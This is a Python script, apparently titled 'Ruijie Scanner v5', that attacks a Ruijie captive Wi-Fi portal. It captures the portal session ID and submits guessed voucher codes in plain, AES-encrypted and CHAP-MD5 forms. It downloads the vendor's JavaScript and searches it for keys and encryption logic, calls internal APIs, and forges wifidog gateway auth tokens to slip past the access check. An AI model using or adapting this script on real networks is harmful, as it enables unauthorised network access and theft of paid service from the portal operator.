#!/usr/bin/env python3
"""
Ruijie Scanner v5 - Downloads JS, fixes RES path, tests auth immediately.
"""
import base64, hashlib, json, os, re, urllib.parse, time
from datetime import datetime
import requests, urllib3
urllib3.disable_warnings()

LOG = []
def log(m): print(m); LOG.append(m)

def parse_octal(s):
    out = bytearray(); i = 0
    while i < len(s):
        if s[i] == '\\' and i+3 < len(s) and s[i+1:i+4].isdigit():
            out.append(int(s[i+1:i+4], 8)); i += 4
        else:
            out.append(ord(s[i])); i += 1
    return bytes(out)

RENDER_KEY = hashlib.md5(b"RenderSecretKey2026!@#").digest()
sess = requests.Session()
sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
sess.verify = False
sess.allow_redirects = True

log("=" * 60)
log(f"RUIJIE SCANNER v5  {datetime.now()}")
log("=" * 60)

# Step 1: Go through portal -> /api/auth/wifidog -> maccauth
r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10)
parsed = urllib.parse.urlparse(r.url)
params = urllib.parse.parse_qs(parsed.query)
host = f"{parsed.scheme}://{parsed.netloc}"

wifidog_url = f"{host}/api/auth/wifidog?stage=portal&{parsed.query}"
r = sess.get(wifidog_url, timeout=10)
maccauth_url = r.url
log(f"Maccauth URL: {maccauth_url}")

maccath_parsed = urllib.parse.urlparse(maccauth_url)
maccath_params = urllib.parse.parse_qs(maccath_parsed.query)
sid = maccath_params.get("sessionId", [""])[0]
res_param = maccath_params.get("RES", [""])[0]
log(f"sessionId: {sid}")
log(f"RES param: {res_param}")

# IMMEDIATELY test auth before anything else
log("\n[1] IMMEDIATE AUTH TEST (right after getting sessionId)...")
api_url = f"{host}/api/auth/voucher/?lang=en_US"

r = sess.post(api_url, json={
    "sessionId": sid,
    "accessCode": "123456",
    "apiVersion": 1
}, timeout=10)
log(f"  Plain JSON: {r.status_code} -> {r.text[:200]}")

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    payload = json.dumps({"sessionId": sid, "accessCode": "123456", "apiVersion": 1})
    iv = os.urandom(16)
    cipher = AES.new(RENDER_KEY, AES.MODE_CBC, iv=iv)
    ct = cipher.encrypt(pad(payload.encode(), AES.block_size))
    enc = base64.urlsafe_b64encode(iv + ct).decode()
    r = sess.post(api_url, json={"data": enc}, timeout=10)
    log(f"  Encrypted: {r.status_code} -> {r.text[:200]}")
except Exception as e:
    log(f"  Encrypted: error {e}")

# Try CHAP-MD5 as code
chap_id = parse_octal(params.get("chap_id", [""])[0])
chap_chal = parse_octal(params.get("chap_challenge", [""])[0])
chap_resp = hashlib.md5(chap_id + b"123456" + chap_chal).hexdigest()
r = sess.post(api_url, json={
    "sessionId": sid,
    "accessCode": chap_resp,
    "apiVersion": 1
}, timeout=10)
log(f"  CHAP as code: {r.status_code} -> {r.text[:200]}")

# Step 2: Try different RES URL formats
log("\n[2] TRYING RES URL FORMATS...")
base = "https://portal-as.ruijienetworks.com/download/static/maccauth"

formats = [
    f"{base}/expand/res/{res_param.split('/')[-1]}",
    f"{base}/expand/res/{res_param.split('/')[-1]}/data.json",
    f"{base}/expand/res/{res_param.split('/')[-1]}/data.json?callback=denyData",
    f"{base}/res/{res_param.split('/')[-1]}",
    f"{base}/src/res/{res_param.split('/')[-1]}",
    f"https://portal-as.ruijienetworks.com/expand/res/{res_param.split('/')[-1]}",
]
for url in formats:
    try:
        r = sess.get(url, timeout=5)
        log(f"  {r.status_code} {url[:90]}")
        if r.status_code == 200 and len(r.text) > 200:
            log(f"    Content: {r.text[:300]}")
    except Exception as e:
        log(f"  ERR {url[:90]}: {e}")

# Step 3: Save critical JS files
log("\n[3] DOWNLOADING KEY JS FILES...")
js_files = [
    "/download/static/maccauth/src/js/common.js?v=260107",
    "/download/static/maccauth/src/js/index.js?v=260107",
]
for js_path in js_files:
    url = f"https://portal-as.ruijienetworks.com{js_path.split('?')[0]}"
    fname = js_path.split("/")[-1].split("?")[0]
    try:
        r = sess.get(url, timeout=10)
        with open(fname, "w") as f:
            f.write(r.text)
        log(f"  Saved {fname} ({len(r.text)} bytes)")

        # Search for API keys, endpoints, encryption logic
        for pattern in [
            r'/api/[a-zA-Z/]+',
            r'encrypt',
            r'CryptoJS',
            r'AES',
            r'secret',
            r'key',
            r'accessCode',
            r'voucher',
            r'sessionId',
        ]:
            matches = re.findall(pattern, r.text, re.I)
            for m in matches[:5]:
                log(f"    Found: {m[:100]}")
    except Exception as e:
        log(f"  Error {fname}: {e}")

# Step 4: Search common.js for _reqByPost and auth methods
log("\n[4] SEARCHING common.js FOR AUTH LOGIC...")
try:
    with open("common.js") as f:
        js = f.read()
    
    # Find all API endpoints
    apis = re.findall(r'["\'](/api/[^"\']+)["\']', js)
    for a in sorted(set(apis)):
        log(f"  API: {a}")

    # Find encrypt functions
    for kw in ['encrypt', 'CryptoJS', 'AES', 'DES', 'MD5', 'SHA', 'base64', 'btoa']:
        lines = [l.strip() for l in js.split('\n') if kw.lower() in l.lower()]
        for l in lines[:3]:
            log(f"  {kw}: {l[:150]}")

    # Find voucher-related code
    for kw in ['voucher', 'accessCode', 'accesscode']:
        lines = [l.strip() for l in js.split('\n') if kw.lower() in l.lower()]
        for l in lines[:5]:
            log(f"  {kw}: {l[:150]}")

except Exception as e:
    log(f"  Error: {e}")

# Step 5: Search index.js for auth logic
log("\n[5] SEARCHING index.js FOR AUTH LOGIC...")
try:
    with open("index.js") as f:
        js = f.read()
    apis = re.findall(r'["\'](/api/[^"\']+)["\']', js)
    for a in sorted(set(apis)):
        log(f"  API: {a}")
    for kw in ['encrypt', 'CryptoJS', 'AES', 'accessCode', 'voucher']:
        lines = [l.strip() for l in js.split('\n') if kw.lower() in l.lower()]
        for l in lines[:3]:
            log(f"  {kw}: {l[:150]}")
except Exception as e:
    log(f"  Error: {e}")

# Step 6: Try saveInternal API
log("\n[6] TRYING /api/auth/saveInternal...")
try:
    r = sess.post(f"{host}/api/auth/saveInternal", json={
        "internalIp": "192.168.11.21",
        "internalPort": "2060",
        "sessionId": sid
    }, timeout=10)
    log(f"  Status: {r.status_code} -> {r.text[:200]}")
except Exception as e:
    log(f"  Error: {e}")

# Step 7: Try various auth endpoints
log("\n[7] TRYING AUTH ENDPOINTS WITH SESSION ID...")
endpoints = [
    ("POST", f"{host}/api/auth/login/", {"sessionId": sid, "accessCode": "123456"}),
    ("POST", f"{host}/api/auth/login/", json.dumps({"sessionId": sid, "accessCode": "123456", "apiVersion": 1})),
]
for method, url, data in endpoints:
    try:
        if method == "POST":
            r = sess.post(url, json=data) if isinstance(data, dict) else sess.post(url, data=data, headers={"Content-Type": "application/json"})
        log(f"  {method} {url}: {r.status_code} -> {r.text[:200]}")
    except Exception as e:
        log(f"  Error: {e}")

# Step 8: Gateway auth with CHAP token - saveInternal first
log("\n[8] GATEWAY AUTH WITH saveInternal...")
try:
    # save internal first
    sess.post(f"{host}/api/auth/saveInternal", json={
        "internalIp": "192.168.11.21",
        "internalPort": "2060",
        "sessionId": sid
    }, timeout=5)
    
    gw_addr = params.get("gw_address", ["192.168.10.1"])[0]
    gw_port = params.get("gw_port", ["2060"])[0]
    
    # Try different tokens
    for token_name, token_val in [
        ("sid", sid),
        ("chap_md5", chap_resp),
        ("md5_sid", hashlib.md5(sid.encode()).hexdigest()),
    ]:
        r = sess.get(f"http://{gw_addr}:{gw_port}/wifidog/auth?token={token_val}",
                     timeout=5, allow_redirects=False)
        loc = r.headers.get("Location","")
        log(f"  token={token_name}: {r.status_code} -> {'denied' if 'denied' in loc else loc[:100]}")
except Exception as e:
    log(f"  Error: {e}")

fname = f"portal_scan5_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
with open(fname, "w") as f:
    f.write("\n".join(LOG))
log(f"\n[+] Saved to {fname}")
